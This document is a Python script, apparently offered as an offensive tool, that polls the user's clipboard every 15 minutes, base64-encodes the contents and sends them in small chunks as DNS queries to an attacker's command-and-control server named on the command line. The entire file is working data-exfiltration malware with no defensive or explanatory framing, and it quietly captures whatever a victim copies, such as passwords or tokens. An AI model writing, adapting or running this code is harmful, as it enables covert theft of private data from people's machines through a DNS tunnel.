#! python3
# This program will paste whatever is in the clipboard every 15 minutes encapsulate
# into DNS payload and send to C2

import pyperclip
import os
import dnslib
import base64
import socket
import time
import argparse


# Function to paste contents of clipboard and encode data into base64

def pasteClipBoard():
    data = pyperclip.paste()
    encodedData = base64.b64encode(data.encode()).decode() + '!EN!'
    print('EncodedDataFromClipboard: ', encodedData)
    return encodedData


def parseArguments():
    parser = argparse.ArgumentParser(description='DNS Payload Clipboard Sender')
    parser.add_argument('domain', help='Domain name that will be used in DNS queries')
    parser.add_argument('c2_address', help='IP address or hostname your C2')
    return parser.parse_args()


# encapsulate data


def sendPayload(encodedData, domain, c2_address):
    try:
        chunkSize = 20
        if len(encodedData) > chunkSize:
            chunks = [encodedData[i:i + chunkSize] for i in range(0, len(encodedData), chunkSize)]
        else:
            chunks = [encodedData]
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client_socket.connect((c2_address, 53))

        # Send a DNS query for each chunk
        for chunk in chunks:
            qtype = dnslib.QTYPE = 'A'
            qname = f"{chunk}.{domain}"
            dns_query = dnslib.DNSRecord.question(qname, qtype)
            print(dns_query)
            client_socket.send(dns_query.pack())

        client_socket.close()
    except Exception as e:
        print(f"An error occurred while sending the DNS query: {e}")


def main():
    args = parseArguments()
    previousValue = None

    while True:
        currentValue = pyperclip.paste()

        if previousValue is not None and currentValue == previousValue:
            time.sleep(15 * 60)
        else:
            payload = pasteClipBoard()
            sendPayload(payload, args.domain, args.c2_address)
            previousValue = currentValue

        time.sleep(15 * 60)


if __name__ == '__main__':
    main()
